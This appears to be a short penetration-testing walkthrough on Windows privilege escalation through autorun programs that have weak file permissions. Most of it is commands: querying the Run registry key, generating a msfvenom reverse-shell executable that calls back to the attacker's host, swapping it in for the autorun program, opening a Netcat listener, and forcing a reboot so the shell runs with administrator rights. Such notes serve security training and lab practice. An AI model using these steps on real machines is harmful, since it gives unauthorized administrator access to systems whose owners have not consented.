Windows allows users to set specific programs to automatically start whenever the system boots, the list of programs that have this functionality enabled is stored in the Windows Registry. Although this feature can be very handy if startup programs are setup with improper permissions it may allow attackers to escalate privileges.



Exploit
-

**Identifying Autorun Programs**

1. The Autorun programs are usually stored in the Run or RunOnce registry keys:
```
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
```
![Screenshot from 2024-09-30 03-47-29](https://github.com/user-attachments/assets/2d152fee-7505-40b8-8e4c-0b5763eea8e4)

2. Now, we shouls check if our user have write access to the `.exe` file from output above 

![Screenshot from 2024-09-30 03-48-44](https://github.com/user-attachments/assets/07bc848d-e3de-45d5-ad3d-09999334ae51)

3. Replace the ```program.exe``` executable with a reverse shell:
```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<our ip> LPORT=1234 -f exe > shell.exe
```

4. Then transferring the `shell.exe` file to the Windows victim machine using the Python web server.

5. At this point, for the reverse shell to be executed the administrator user would have to login, or alternatively the system can be rebooted. Running the following command to find out whether the current user has permissions to do so:
```
whoami /priv
```
![Screenshot from 2024-09-30 03-53-52](https://github.com/user-attachments/assets/ba8371e6-03a0-4479-b676-24830bdd0b93)

From the output of the command it looks like it does. 

6.The next step is to set up a Netcat listener:
```
nc -nlvp 1234
```
7. All we need now is to reboot the target machine and get the granted shell.
```
shutdown /r /t 0
```

Once the administrator user has logged on, the malicious executable was executed, therefore granting a reverse shell as that user.






